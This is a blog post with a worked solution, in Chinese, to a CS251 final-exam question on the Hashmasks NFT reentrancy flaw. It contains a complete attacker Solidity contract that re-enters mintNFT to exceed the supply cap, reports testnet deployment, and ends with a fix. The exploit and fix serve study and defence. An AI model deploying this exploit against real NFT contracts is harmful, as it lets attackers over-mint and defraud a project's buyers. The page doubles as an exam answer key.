<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> CS251 - final 2021 - 问题 4 · QIWIHUI</title><meta name="description" content="CS251 - final 2021 - 问题 4 - qiwihui"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/nella.css"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.12/css/all.css" integrity="sha384-G0fIWCsCzJIMAVNQPfjH08cyYaUtMwjJwqiRKxxE/rx96Uroj1BtIQ6MLJuheaO9" crossorigin="anonymous"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
google_ad_client: "ca-pub-8935595858652656",
enable_page_level_ads: true
});
</script><link rel="search" type="application/opensearchdescription+xml" href="https://qiwihui.com/atom.xml" title="QIWIHUI"><meta property="og:site_name" content="QIWIHUI"><meta property="og:url" content="https://qiwihui.com/qiwihui-blog-157/index.html"><meta property="og:title" content="CS251 - final 2021 - 问题 4"><meta property="og:description" content="CS251 - final 2021 - 问题 4"><meta property="og:type" content="article"><script src="//code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/images/avatar.jpg" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/about/" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="/search/" target="_self" class="nav-list-link">SEARCH</a></li><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">HOME</a></li><li class="nav-list-item"><a href="/projects/" target="_self" class="nav-list-link">PROJECTS</a></li><li class="nav-list-item"><a href="/tags/" target="_self" class="nav-list-link">TAGS</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li><li class="nav-list-item"><a href="/links/" target="_self" class="nav-list-link">LINKS</a></li><!--li.nav-list-item--><!--    a.nav-list-link(class="search" href=url_for("search") target="_self") SEARCH--></ul></header><main class="container"></main><div class="post"><article class="post-block"><h1 class="post-title">CS251 - final 2021 - 问题 4</h1><div class="post-info">May 15, 2024<span class="categories"><i class="fa fa-bookmark" aria-hidden="true"></i></span><span>7 min. read</span></div><div class="post-content"><p><strong>问题4. [16 分]: Hashmasks 重入缺陷</strong></p>
<p>在第8课和第3节中，我们讨论了 solidity 重入缺陷。在这个问题中，我们将看一个有趣的现实世界的例子。考虑下面16384个NFT中使用的 solidity 代码片段。通过调用此NFT合约上的 <code>mintNFT()</code> 函数，用户一次最多可以铸造20个NFT。您可以假设所有内部变量都由构造函数正确初始化（未显示）。</p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function mintNFT(uint256 numberOfNfts) public payable &#123;</span><br><span class="line">  require(totalSupply() &lt; 16384, &apos;Sale has already ended&apos;);</span><br><span class="line">  require(numberOfNfts &gt; 0, &apos;numberOfNfts cannot be 0&apos;);</span><br><span class="line">  require(numberOfNfts &lt;= 20, &apos;You may not buy more than 20 NFTs at once&apos;);</span><br><span class="line">  require(totalSupply().add(numberOfNfts) &lt;= 16384, &apos;Exceeds NFT supply&apos;);</span><br><span class="line">  require(getNFTPrice().mul(numberOfNfts) == msg.value, &apos;Value sent is not correct&apos;);</span><br><span class="line">  for (uint256 i = 0; i &lt; numberOfNfts; i++) &#123;</span><br><span class="line">    uint256 mintIndex = totalSupply(); // get number of NFTs issued so far</span><br><span class="line">    _safeMint(msg.sender, mintIndex); // mint the next one</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _safeMint(address to, uint256 tokenId) internal virtual override &#123;</span><br><span class="line">  // Mint one NFT and assign it to address(to).</span><br><span class="line">  require(!_exists(tokenId), &apos;ERC721: token already minted&apos;);</span><br><span class="line">  _data = _mint(to, tokenId); // mint NFT and assign it to address to</span><br><span class="line">  _totalSupply++; // increment totalSupply() by one</span><br><span class="line">  if (to.isContract()) &#123;</span><br><span class="line">    // Confirm that NFT was recorded properly by calling</span><br><span class="line">    // the function onERC721Received() at address(to).</span><br><span class="line">    // The arguments to the function are not important here.</span><br><span class="line">    // If onERC721Received is implemented correctly at address(to) then</span><br><span class="line">    // the function returns _ERC721_RECEIVED if all is well.</span><br><span class="line">    bytes4 memory retval = IERC721Receiver(to).onERC721Received(to, address(0), tokenId, _data);</span><br><span class="line">    require(retval == _ERC721_RECEIVED, &apos;NFT Rejected by receiver&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>让我们证明 <code>_safeMint</code> 根本不安全（尽管它的名字是安全）。</p>
<p><strong>A)</strong>    假设已经铸造了16370个NFT，那么 totalSupply()=16370。请解释恶意合约如何导致超过16384个NFT被伪造。攻击者最多可以造出多少个NFT？</p>
<p>提示：如果在调用地址 <code>onERC721Received</code> 是恶意的，结果会怎样？请仔细检查铸币回路，并考虑重入缺陷。</p>
<p><strong>答：</strong> 在已经 mint 16370 个NFT基础上，调用 mingNFT 可传入的最大 numberOfNfts 为 14 可以通过 mintNFT 开始五行的限制，当上述合约在调用地址 <code>to</code> 上的 <code>onERC721Received</code> 函数时，这个函数可以再次调用上述 mingNFT 函数，此时，在原来已经 mint 一个的基础上，传入的 numberOfNfts 为 13 个可以通过 mintNFT 的限制，然后重复同样的过程，依次可以 mint 12， 11 直到 1，最后在函数内部，已经没有其他限制，故这些数量的 NFT 均可以被 mint，所以理论上总共可以 mint 的数量为 $14+13+\dots+2+1=105$。</p>
<p><strong>B)</strong>    假设现在总供给的价值是16370，请写出实施对（a）部分进行攻击的恶意Solidity合约代码。</p>
<p><strong>答：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Attacker is IERC721Receiver &#123;</span><br><span class="line">  Hashmasks hashmasks;</span><br><span class="line"></span><br><span class="line">  constructor(address _hashmasksAddress) &#123;</span><br><span class="line">    hashmasks = Hashmasks(_hashmasksAddress);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack() public payable&#123;</span><br><span class="line">    &#123;</span><br><span class="line">      uint256 num = hashmasks.balanceOf(address(this));</span><br><span class="line">      // console.log(&quot;num: &quot;, num);</span><br><span class="line">      if (num &lt; 14) &#123;</span><br><span class="line">        // 16384 - 16370 = 14</span><br><span class="line">        hashmasks.mintNFT&#123;value: 14-num&#125;(14 - num);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function onERC721Received(</span><br><span class="line">    address _from,</span><br><span class="line">    address _to,</span><br><span class="line">    uint256 _tokenId,</span><br><span class="line">    bytes memory _data</span><br><span class="line">  ) external returns (bytes4) &#123;</span><br><span class="line">    attack();</span><br><span class="line">    return msg.sig;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中 <code>attack</code> 设置为 <em><code>payable</code> 是因为需要通过攻击合约调用 mintNFT 函数，需要发送一定数量的以太，可以选择在部署后先发送一定数量的以太到攻击者合约中，也可以将 <code>attack</code> 设置成 <code>payable</code>，在攻击的交易中发送以太到</em></p>
<p>实验：在 Rinkeby 上部署，攻击者合约地址为 0xf1eb80Bb66A70E44d42B3ceC0bC18Ec28B5F2Ea8，实际攻击的交易：<a href="https://rinkeby.etherscan.io/tx/0xb90496fd8789c3d1800df1bd3a571d019fb6158cbd521a9d05e57ad62460d15f" target="_blank" rel="noopener">https://rinkeby.etherscan.io/tx/0xb90496fd8789c3d1800df1bd3a571d019fb6158cbd521a9d05e57ad62460d15f</a>，这个部署的合约中，NFT的价格设置为 1 wei，所以理论上只要发送 105 wei 到攻击这合约中，但是保险起见，发送了150wei，最后也可以看到攻击这合约中还剩下 45 wei。</p>
<p><strong>C)</strong>    你会在前一页的代码中添加或更改哪一行Solidity来防止你的攻击?请注意，单个交易不应该铸造超过20个NFT。</p>
<p><strong>答：</strong> 可以将 <code>_safeMint</code> 方法中， <code>_totalSupply++;</code> 这一行放到验证 NFT 的调用之后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> function _safeMint(address to, uint256 tokenId) internal virtual override &#123;</span><br><span class="line">   // Mint one NFT and assign it to address(to).</span><br><span class="line">   require(!_exists(tokenId), &apos;ERC721: token already minted&apos;);</span><br><span class="line">   _data = _mint(to, tokenId); // mint NFT and assign it to address to</span><br><span class="line">   </span><br><span class="line">   if (to.isContract()) &#123;</span><br><span class="line">     // Confirm that NFT was recorded properly by calling</span><br><span class="line">     // the function onERC721Received() at address(to).</span><br><span class="line">     // The arguments to the function are not important here.</span><br><span class="line">     // If onERC721Received is implemented correctly at address(to) then</span><br><span class="line">     // the function returns _ERC721_RECEIVED if all is well.</span><br><span class="line">     bytes4 memory retval = IERC721Receiver(to).onERC721Received(to, address(0), tokenId, _data);</span><br><span class="line">     require(retval == _ERC721_RECEIVED, &apos;NFT Rejected by receiver&apos;);</span><br><span class="line">   &#125;</span><br><span class="line">_totalSupply++; // increment totalSupply() by one</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>这样，当合约被重入攻击时，由于 <code>_totalSupply</code> 还没有增加，因此在第二次进入 <code>mintNFT</code> 函数时 <code>mintIndex</code> 的值是第一次 mint 的值，会导致触发 <code>'ERC721: token already minted'</code> 这个错误，有效保证合约安全。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for (uint256 i = 0; i &lt; numberOfNfts; i++) &#123;</span><br><span class="line">  uint256 mintIndex = totalSupply(); // get number of NFTs issued so far</span><br><span class="line">  _safeMint(msg.sender, mintIndex); // mint the next one</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>验证交易： <a href="https://rinkeby.etherscan.io/tx/0xa5f70a226c5fd64132eee800f8902ddb9b4ff562ff7f37820d11746fbde52acb" target="_blank" rel="noopener">https://rinkeby.etherscan.io/tx/0xa5f70a226c5fd64132eee800f8902ddb9b4ff562ff7f37820d11746fbde52acb</a></p>
<p>感谢 discord <strong>yyczz#5837</strong> 对于这个问题的指导。</p>
<h3><span id="comments">Comments</span></h3>
</div><p class="post-tags"><i class="fa fa-tags" aria-hidden="true"></i><a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">#区块链</a></p></article></div><div class="post-copyright"><blockquote><p>版权声明：本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/" target="_blank" rel="noopener">署名-相同方式共享 | CC BY-SA 4.0 </a>许可协议。</p></blockquote></div><footer><div class="paginator"><a href="/qiwihui-blog-154/" class="prev">PREV</a><a href="/qiwihui-blog-160/" class="next">NEXT</a></div><div id="disqus_thread"></div><script>var disqus_shortname = 'blog-qiwihui-com';
var disqus_identifier = 'qiwihui-blog-157/';
var disqus_title = 'CS251 - final 2021 - 问题 4';
var disqus_url = 'https://qiwihui.com/qiwihui-blog-157/';
(function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//blog-qiwihui-com.disqus.com/count.js" async></script><!-- block copyright--></footer></div><script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [['$','$'], ['\\(','\\)']],
        processEscapes: true,
        processEnvironments: true,
        skipTags: ["script","noscript","style","textarea","code","pre"]
    }
});
</script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-46660488-3",'auto');ga('send','pageview');</script><link rel="stylesheet" href="//cdn.datatables.net/1.10.7/css/jquery.dataTables.min.css" media="screen" type="text/css"><script src="//cdn.datatables.net/1.10.7/js/jquery.dataTables.min.js"></script><script>$(function(){$('.datatable').dataTable( {"order": [[ 0, "desc" ]],"iDisplayLength": -1,"lengthMenu": [[10, 25, 50, -1], [10, 25, 50, "All"]]} );});</script></body></html>